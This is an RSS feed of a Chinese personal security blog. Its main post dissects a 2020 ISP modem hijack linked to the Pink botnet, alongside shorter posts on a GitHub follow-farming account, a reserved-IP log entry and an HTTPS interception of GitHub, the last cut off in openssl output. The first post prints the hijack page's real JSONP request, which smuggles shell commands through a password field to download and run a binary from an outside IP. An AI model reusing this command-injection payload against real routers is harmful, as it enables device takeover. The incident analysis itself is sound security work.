<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="/xsl/rss.xsl"?><rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>事件 - 分类 - zu1k</title><link>https://zu1k.com/categories/event/</link><description>以正常人类的视角观察世界，记录发生在我身边的有趣或者重要的事件</description><language>zh-CN</language><managingEditor>i@zu1k.com (zu1k)</managingEditor><webMaster>i@zu1k.com (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><atom:link href="https://zu1k.com/categories/event/" rel="self" type="application/rss+xml"/><item><title>从最近披露的Pink僵尸网络想到的</title><link>https://zu1k.com/posts/events/pinkbot/</link><pubDate>Wed, 27 Oct 2021 13:00:45 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/events/pinkbot/</guid><description><![CDATA[<p>昨天上课的时候无聊刷<a href="https://www.v2ex.com/t/810633" target="_blank" rel="noopener noreffer" class="post-link">V2EX</a>，读到 360 Netlab 发布的文章<a href="https://blog.netlab.360.com/pinkbot/" target="_blank" rel="noopener noreffer" class="post-link">《一个藏在我们身边的巨型僵尸网络 Pink》</a>，披露了2019年底到2020年春节前后的一个名为&quot;<strong>Pink</strong>&ldquo;的巨型僵尸网络从被发现到攻防博弈过程的一些细节</p>
<p>文中的攻防过程令我很是激动，因为我想起了在2020年初的一件事</p>
<h2 id="光猫升级事件"><a href="#光猫升级事件" class="header-mark headerLink">光猫升级事件</a></h2>
<p>2020年1月初，访问某些http协议(80端口)的网站，会被劫持到一个联通光猫升级页面</p>
<p><figure>




    
        
        
        
        
    
<a class="lightgallery"
        href="/posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp"
        title="百度贴吧被劫持到升级页面"
        data-thumbnail="/posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp"
        
            data-sub-html="<h2>百度贴吧被劫持到升级页面</h2><p>百度贴吧被劫持到升级页面</p>"
        
        >
        
    </a><figcaption class="image-caption">百度贴吧被劫持到升级页面</figcaption>
    </figure></p>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon icon-info-circled"></i>信息<i class="details-icon icon-angle-circled-right"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">对这个页面的源码在gist上进行了<a href="https://gist.github.com/zu1k/7120d1f71797153eb8c867bb09323eae" target="_blank" rel="noopener noreffer" class="post-link">备份</a>，感兴趣的同学可以看一下 <a href="https://gist.github.com/zu1k/7120d1f71797153eb8c867bb09323eae#L9923" target="_blank" rel="noopener noreffer" class="post-link">9923</a> 行</div>
        </div>
    </div>
<h3 id="官方后门"><a href="#官方后门" class="header-mark headerLink">官方后门</a></h3>
<p>通过查看请求和页面源码可以发现这个页面通过向 <code>192.168.1.1</code> 的某个接口进行 <strong>jsonp</strong> 请求来执行命令</p>
<div class="highlight"><div class="chroma">
<div class="table-wrapper"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ajax</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//document.getElementById(&#34;tip&#34;).innerHTML=&#34;请重启光猫，并保持页面不关闭，重启后请立即连接光猫WIFI或者网口，等待五分钟后检查网络是否正常&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">dataType</span><span class="o">:</span> <span class="s1">&#39;jsonp&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">data</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">jsonp</span><span class="o">:</span> <span class="s1">&#39;callback&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;http://192.168.1.1/createNewFolder.json?enlpassword=1234567890abcdefx1234567890abcdefxx1234567890abcdefxxx1eee;iptables -I OUTPUT -p tcp --dport 443 -j DROP;iptables -I OUTPUT -p udp --dport 123 -j DROP;if [ ! -f /tmp/sdsjw ] %26%26 wget http://182.43.249.225:19735/sdsjw -P /tmp;then chmod 777 /tmp/sdsjw;/tmp/sdsjw;fi; /jsonp?&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">success</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">));</span>   <span class="c1">// 这里是返回数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">//document.getElementById(&#34;tip&#34;).innerHTML=&#34;设备正在升级，请等待五分钟后检查网络是否正常&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="nx">error</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">XLMHttpResponse</span><span class="p">,</span><span class="nx">textStatus</span><span class="p">,</span><span class="nx">errorThrown</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">XLMHttpResponse</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                    <span class="c1">//document.getElementById(&#34;tip&#34;).innerHTML=&#34;设备正在升级，请等待五分钟后检查网络是否正常&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="nx">complete</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">XLMHttpResponse</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">XLMHttpResponse</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                    <span class="c1">//document.getElementById(&#34;tip&#34;).innerHTML=&#34;设备正在升级，请等待五分钟后检查网络是否正常&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>很明显，这是一个后门，或者是一个漏洞，我更相信这是一个官方后门</p>
<p>根据它的写法我稍微测试了一下，通过jsonp跨域，进行CSRF，的确可以执行任意命令</p>
<p><figure>




    
        
        
        
        
    
<a class="lightgallery"
        href="/posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp"
        title="测试这个后门"
        data-thumbnail="/posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp"
        
            data-sub-html="<h2>测试后门</h2><p>测试这个后门</p>"
        
        >
        
    </a><figcaption class="image-caption">测试后门</figcaption>
    </figure></p>
<p>如果被利用了，岂不是？？？又有谁知道到底是不是已经被利用了呢，反正我不知道</p>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon icon-info-circled"></i>信息<i class="details-icon icon-angle-circled-right"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>我很早之前就把光猫设置为桥接模式了，利用自己的路由器拨号，不受该后门影响</p>
<p>局域网也改为另外一个网段了，“192.168.1.1” 根本没有机器</p>
</div>
        </div>
    </div>
<p>再回过头来看升级页面执行的shell命令:</p>
<div class="highlight"><div class="chroma">
<div class="table-wrapper"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">iptables -I OUTPUT -p tcp --dport <span class="m">443</span> -j DROP<span class="p">;</span>
</span></span><span class="line"><span class="cl">iptables -I OUTPUT -p udp --dport <span class="m">123</span> -j DROP<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> ! -f /tmp/sdsjw <span class="o">]</span> <span class="o">&amp;&amp;</span> wget http://182.43.249.225:19735/sdsjw -P /tmp<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    chmod <span class="m">777</span> /tmp/sdsjw<span class="p">;</span>
</span></span><span class="line"><span class="cl">    /tmp/sdsjw<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">/jsonp?
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>当初看这段命令的时候就觉得非常奇怪</p>
<p>为什么上来第一句就要阻断到所有目标443端口的tcp连接？当初的一个想法是防止用户用https协议，这样用户只能使用80端口的http明文协议，可以进行监听或者劫持等操作。这样也不合理啊，HSTS也不是吃干饭的，再说联通如果通过更新屏蔽掉到443端口的所有请求，不怕用户集体反馈和投诉吗？反正当初是没想通这个谜之操作</p>
<p>再看第二句，也莫名其妙，udp 123端口是NTP服务，找你惹你了，犯不着全部屏蔽掉吧。还是想不明白</p>
<p>往后的命令就比较常规了，下载了一个二进制程序，权限修改为<code>777</code>，然后直接执行</p>
<h3 id="怀疑被攻击"><a href="#怀疑被攻击" class="header-mark headerLink">怀疑被攻击</a></h3>
<p>通过对上面升级执行的命令进行分析，我觉得这些操作很不符合常理，将这些已知信息在小群里交流之后，怀疑可能是一起攻击事件，通过劫持用户的http访问，利用光猫的后门(可能是漏洞，虽然我不信)植入恶意程序</p>
<p>遂决定对<code>sdsjw</code>程序进行逆向分析，分析的枯燥过程这里省略了，最后结果就是没有发现什么异常的点，到这里对这个事件的分析便不了了之了（当初的二进制程序我找不到了，现在也下载不到了）</p>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon icon-info-circled"></i>信息<i class="details-icon icon-angle-circled-right"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>通过逆向mips版的升级程序，我得出了两个结论：</p>
<ul>
<li>JEB的MIPS逆向体验很不错</li>
<li>毛子的JEB破解版真好用</li>
</ul>
</div>
        </div>
    </div>
<h3 id="联通工作人员上门升级"><a href="#联通工作人员上门升级" class="header-mark headerLink">联通工作人员上门升级</a></h3>
<p>2020年5月10号下午，联通工作人员上门进行光猫升级。具体升级方法就是把一块板子通过光猫侧面的口插到主板上，然后通过手机上的app进行固件刷写</p>
<p>在交流的过程中，他透漏光猫大批量被控，有对外攻击流量，接上面要求需要对所有光猫进行升级。我家的光猫在线升级失败，只能到户手动完成。我看了一下他需要上门的名单，看样子我们这个区域关闭了在线管理接口的用户还不少啊哈哈哈</p>
<p><figure>




    
        
        
        
        
    
<a class="lightgallery"
        href="/posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp"
        title="联通工作人员上门升级"
        data-thumbnail="/posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp"
        
            data-sub-html="<h2>联通工作人员上门升级</h2><p>联通工作人员上门升级</p>"
        
        >
        
    </a><figcaption class="image-caption">联通工作人员上门升级</figcaption>
    </figure></p>
<h2 id="我在第一层人家在第5层"><a href="#我在第一层人家在第5层" class="header-mark headerLink">我在第一层，人家在第5层</a></h2>
<p>虽然这个事已经过去一年多了，但现在想起来还是有那么一些感触，在运营商与黑客的一轮又一轮攻防博弈中，我有幸记录下其中某个小小的过程。在信息还未对外揭露之前，我无法理解那些莫名其妙的升级指令，甚至怀疑那是一起攻击事件，利用自己微不足道的知识尝试分析却不得结果。当保密期过去之时，我们得以看到整个事件的原貌，不禁感叹，我还是太年轻了啊（好像听到了“长者”的话）</p>
<h3 id="关于看待事情"><a href="#关于看待事情" class="header-mark headerLink">关于看待事情</a></h3>
<p>所谓“管中窥豹，略见一斑”，从这件事我学到的第一点便是，要有大局观，要广泛的收集信息，看待某件事时要把时间线放长，这样才能去尽力触及事情的真相</p>
<h3 id="关于现代网络攻击"><a href="#关于现代网络攻击" class="header-mark headerLink">关于现代网络攻击</a></h3>
<p>我学到的第二点是关于现代网络攻击。我觉得我对网络攻击的印象还停留在早年的那些简单的漏洞利用，虽然近几年通过网络也吃了不少现代网络攻击事件的瓜，但是并未意识到真正的网络攻击就潜伏在你我身边</p>
<p>通过本次事件我们可以清晰的看出，现代的网络攻击使用的技术更加先进，对隐匿性的要求也更高，如果不是有广泛的监控难以发现。在遇到厂商的狙杀时攻击者能够在第一时间绕过和阻拦，甚至能够在多轮对抗中取得优势将厂商直接阻拦在门外，夺取绝对的控制权，逼迫厂商只能线下进行上门修复</p>
<p>简单列几句文中的原话：</p>
<ul>
<li>“至对光猫固件做了多处改动后，还能确保光猫能够正常使用”</li>
<li>“在与相关厂商的屡次攻防博弈中，PinkBot 的运营者都占据了明显的对抗优势”</li>
<li>“PinkBot 在整个过程中表现出了极强的针对性和专业性，各方面能力都很均衡，甚至有些可怕”</li>
<li>“攻击者还使用了ecdsa对配置信息进行了签名”</li>
</ul>
<p>我觉得不可思议的是这一句：</p>
<ul>
<li>“我们一直阶段性的对公网上的 Pink 节点进行持续监测，通过对 2021/10/20日的日志分析，我们仍然可以看到 103024 个 IP 处于日活状态。这表明，当前的 pink 的感染规模仍然在 10w 量级左右，涉及多家设备厂商，按照每个IP对应一个三口之家来计算，受影响人群大概 30w 人左右”</li>
</ul>
<p>被发现近2年，竟然还没有清除干净，这存活能力得有多强，难以想象</p>
<p>结论：攻击者能力很强，未来遭遇的攻击会更加专业和可怕</p>
<h3 id="关于个人安全"><a href="#关于个人安全" class="header-mark headerLink">关于个人安全</a></h3>
<p>关于个人安全，其实我没有发言权，毕竟我也曾踩过别人的水坑</p>
<p>但是我还是要说一句，就是保持差异化，默认的配置只会给攻击者创造便利</p>
<p>再加一句，不要把自己的安全完全托付在别人手中</p>
<h2 id="参考链接"><a href="#参考链接" class="header-mark headerLink">参考链接</a></h2>
<ul>
<li><a href="https://www.v2ex.com/t/810633" target="_blank" rel="noopener noreffer" class="post-link">运营商收回公网 IP 的原因之一</a></li>
<li><a href="https://blog.netlab.360.com/pinkbot/" target="_blank" rel="noopener noreffer" class="post-link">一个藏在我们身边的巨型僵尸网络 Pink</a></li>
<li><a href="https://www.freebuf.com/articles/endpoint/243189.html" target="_blank" rel="noopener noreffer" class="post-link">用户端设备ONU被肉鸡攻击实例浅析</a></li>
</ul>
]]></description></item><item><title>不讲武德！来骗Follow</title><link>https://zu1k.com/posts/events/cheat-for-follow/</link><pubDate>Sat, 28 Nov 2020 15:07:17 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/events/cheat-for-follow/</guid><description><![CDATA[<p>下午，还是习惯性的打开GitHub，发现有个没有头像的人Follow我</p>
<p>




    
        
        
        
        
    
</p>
<p>通常出于礼貌，我会查看对方的个人页和他的仓库，如果感觉不错便会回Follow他</p>
<p>当我打开他的GitHub个人profile页面，令我惊讶的是他总共follow了<strong>59.3k</strong>人，而他的followers人数又七百多人</p>
<p>




    
        
        
        
        
    
</p>
<p>他只Pin了一个仓库，有70多个star，按理说无法吸引如此多数量的followers，这激起了我的好奇，难不成有什么好的内容没有Pin出来？</p>
<p>




    
        
        
        
        
    
</p>
<p>先看了一下他的贡献，连续两年都很稀疏，也没有什么突出的贡献量，平平无奇</p>
<p>




    
        
        
        
        
    
</p>
<p>




    
        
        
        
        
    
</p>
<p>接下来查看他的仓库，一共有三百五十多个仓库，其中绝大多数都是Fork来的，通过筛选找到他自己的仓库25个</p>
<p>




    
        
        
        
        
    
</p>
<p>仔细查看这25个项目，除了他pin出来的那个仓库有73个star外，其他的统统都没有或者仅有个位数star</p>
<p>




    
        
        
        
        
    
</p>
<p>而仓库的内容也没有太有价值的东西，所以几乎可以判断他的follower不是因为有价值的东西而follow的</p>
<p>他Follow了近6万人，star了5千多个项目，结合我自己有回Follow的习惯，看样子这个人的follower大部分都是被骗来的</p>
<p>这个程序员不讲武德。来，骗！我涉世未深的，小同志。这好吗？这不好。</p>
<p>我劝！这位，程序员，耗子尾汁，好好反思。以后不要再犯这样的聪明，小聪明，啊</p>
<blockquote>
<p>感兴趣的同学看这里：https://github.com/Lisprez</p>
</blockquote>
]]></description></item><item><title>一个来自保留IP地址的连接</title><link>https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/</link><pubDate>Mon, 25 May 2020 15:22:09 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/events/why-reveice-connection-from-class-e-ip/</guid><description><![CDATA[<p>昨天看了一篇文章，文章最后使用IP logger进行钓鱼，最后记录下来的IP地址让我大跌眼镜</p>
<p>万万没有想到，记录下来的IP地址竟然是是 244.242.105.51</p>
<p>




    
        
        
        
        
    
</p>
<p>这可是一个E类IP地址，是属于保留地址，是未来用来做ip研究用的，目前并没有开放使用啊</p>
<p>考虑到文章中是对一个地下黑客组织进行钓鱼，所以我有理由相信，这个访问记录是通过某种高超的我从来没有听说过的手段实现的</p>
<p>IP Logger为啥会记录到这样一个IP的访问呢？ 这个问题一直到现在都在困扰我</p>
<p>下面记录一下我对这个的分析</p>
<h2 id="大端小端"><a href="#大端小端" class="header-mark headerLink">大端？小端？</a></h2>
<p>众所周知计算机程序根据cpu架构和操作系统种类不同，数据在内存中存放有大端序和小端序两种情况，这个顺序叫做主机序</p>
<p>而网络传输需要在不同主机序的计算机之间兼容，所以又规定了一个网络序，规定网络传输一律使用大端序</p>
<p>文章中作者猜测是访问者使用的主机是小端序的，所以会又这样一个记录</p>
<p>我个人认为这个猜测不成立</p>
<p>因为一般ip层报文都是由操作系统网络栈来构造的，操作系统自身不会犯忘记转换成网络序的错误</p>
<p>即使是访问者技术高超自己写代码构造的ip包，那源ip是E类ip地址，返程的ip包根本没有路由啊，这样子连tcp连接都建立不了，更不要谈ip logger记录下浏览器的user-agent</p>
<h2 id="tor"><a href="#tor" class="header-mark headerLink">Tor?</a></h2>
<p>考虑到记录下来的user-agent与tor浏览器的一致，并且对方是黑客组织，使用tor也是非常普遍，所以分析一下通过tor能不能实现伪造自己的ip为E类ip</p>
<p>tor连接的流程中，每个tor relay不会知道完整的路由路径，只知道上一个节点与下一个节点，并且这个路由是在应用层实现的，如果黑客控制了某些tor relay，通过这些relay能不能实现这个伪造？</p>
<h3 id="提供onion-service"><a href="#提供onion-service" class="header-mark headerLink">提供onion service</a></h3>
<p>如果ip logger提供onion service，那他记录下来的ip应该是 会合节点的ip</p>
<p>通过我上一篇博客学习的内容可以知道，这个会合节点是由客户端选择的，所以我们假设黑客这里选择了自己控制的某个tor relay作为会合节点，并且将这个E类ip地址写在介绍信中发送给介绍节点</p>
<p>ip logger服务器如果没有怀疑这个E类IP地址，通过tor网络去连接这个会合节点，那在它的exit relay那里一定会连不上这个ip，因为会出现空路由</p>
<p>所以如果要让连接成功建立，必须让ip logger到会合节点的relay路径中某个relay节点对这个错误的ip进行了更正，最简单的是控制exit relay，检查到最终访问的是错误ip便进行更正</p>
<p>而这个relay路径中的每个relay都是ip logger自己选择的，所以黑客需要控制tor网络中的大部分relay????这不现实！！！</p>
<h3 id="不提供onion-service"><a href="#不提供onion-service" class="header-mark headerLink">不提供onion service</a></h3>
<p>如果ip logger不是提供onion service，而是提供公开的服务，那它记录下来的应该是 黑客选择的exit relay，即使黑客控制了这个relay也没办法伪造ip啊</p>
<p>所以通过tor的某些机制伪造成这个E类ip不太现实</p>
<h2 id="路由劫持"><a href="#路由劫持" class="header-mark headerLink">路由劫持？</a></h2>
<p>我对公网的路由不太了解，但是看样子进行路由劫持是有可能的</p>
<p>如果黑客创建了一条假的路由路径，并在路由途中的某个节点对这个E类ip进行更正，也是有可能的，不过看起来难度很大啊</p>
<blockquote>
<p>才疏学浅，文中可能有错误，欢迎指正
目前这个问题还在困扰我，如果有大佬知道答案，希望能够告诉我</p>
</blockquote>
]]></description></item><item><title>GitHub等大面积https劫持</title><link>https://zu1k.com/posts/events/mitm-https-hijack-github/</link><pubDate>Fri, 27 Mar 2020 08:47:11 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/events/mitm-https-hijack-github/</guid><description><![CDATA[<p>昨天下午两点多，突然在一个站长群里听到有人说 GitHub Pages 的证书大批量出现错误，不一会就在V2EX上看到相关讨论的帖子</p>
<p>当天晚上再次刷V2EX的时候发现部分cloudflare的IP和京东主站部分IP也出现相似的劫持事件</p>
<p>今天早晨8点左右，在V2EX上发现有人讨论 GitHub 主站出现相同的https劫持，不经过代理访问发现证书的确异常</p>
<p>




    
        
        
        
        
    
</p>
<p>查看证书详情</p>
<p>




    
        
        
        
        
    
</p>
<p>




    
        
        
        
        
    
</p>
<h2 id="检查github证书"><a href="#检查github证书" class="header-mark headerLink">检查GitHub证书</a></h2>
<p>这里我通过北京和香港两台阿里云主机，使用openssl提供的方法查看证书详细内容</p>
<p>命令为: <code>openssl s_client -showcerts -connect github.com:443 &lt; /dev/null</code></p>
<h3 id="北京阿里云"><a href="#北京阿里云" class="header-mark headerLink">北京阿里云</a></h3>
<details>
  <summary>点击展开</summary>
<div class="highlight"><div class="chroma">
<div class="table-wrapper"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  ~ openssl s_client -showcerts -connect github.com:443 &lt; /dev/null
</span></span><span class="line"><span class="cl">CONNECTED<span class="o">(</span>00000003<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">depth</span><span class="o">=</span><span class="m">1</span> <span class="nv">C</span> <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
</span></span><span class="line"><span class="cl">verify error:num<span class="o">=</span>19:self signed certificate in certificate chain
</span></span><span class="line"><span class="cl">verify <span class="k">return</span>:1
</span></span><span class="line"><span class="cl"><span class="nv">depth</span><span class="o">=</span><span class="m">1</span> <span class="nv">C</span> <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
</span></span><span class="line"><span class="cl">verify <span class="k">return</span>:1
</span></span><span class="line"><span class="cl"><span class="nv">depth</span><span class="o">=</span><span class="m">0</span> <span class="nv">C</span> <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> SERVER, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
</span></span><span class="line"><span class="cl">verify <span class="k">return</span>:1
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Certificate chain
</span></span><span class="line"><span class="cl"> <span class="m">0</span> s:C <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> SERVER, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
</span></span><span class="line"><span class="cl">   i:C <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
</span></span><span class="line"><span class="cl">-----BEGIN CERTIFICATE-----
</span></span><span class="line"><span class="cl">MIIB4TCCAYcCFDjGwZUOfrr1+SWHR5GxJ/rwXsHZMAoGCCqGSM49BAMCMHExCzAJ
</span></span><span class="line"><span class="cl">BgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoMA0NP
</span></span><span class="line"><span class="cl">TTEMMAoGA1UECwwDTlNQMQswCQYDVQQDDAJDQTEfMB0GCSqGSIb3DQEJARYQMzQ2
</span></span><span class="line"><span class="cl">NjA4NDUzQHFxLmNvbTAeFw0xOTA5MjYwOTMzMTNaFw0yOTA5MjMwOTMzMTNaMHUx
</span></span><span class="line"><span class="cl">CzAJBgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoM
</span></span><span class="line"><span class="cl">A0NPTTEMMAoGA1UECwwDTlNQMQ8wDQYDVQQDDAZTRVJWRVIxHzAdBgkqhkiG9w0B
</span></span><span class="line"><span class="cl">CQEWEDM0NjYwODQ1M0BxcS5jb20wWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAASJ
</span></span><span class="line"><span class="cl">27aMaVclvmdT8m6l98K999FM4dYTg4ag0627S2bxbLYHyLdQ0jqay5kA9KCF9Ucw
</span></span><span class="line"><span class="cl">uzcqtTrNERlLIsxDGkLjMAoGCCqGSM49BAMCA0gAMEUCIH1+jEiQTVA+siP2g9kw
</span></span><span class="line"><span class="cl">ITFZZINVKyET48788OSCLK1hAiEA+c5bJvnrdtZ1rbsLXJWtglkXSeBaHy5Wdt7w
</span></span><span class="line"><span class="cl"><span class="nv">dGc7McM</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">-----END CERTIFICATE-----
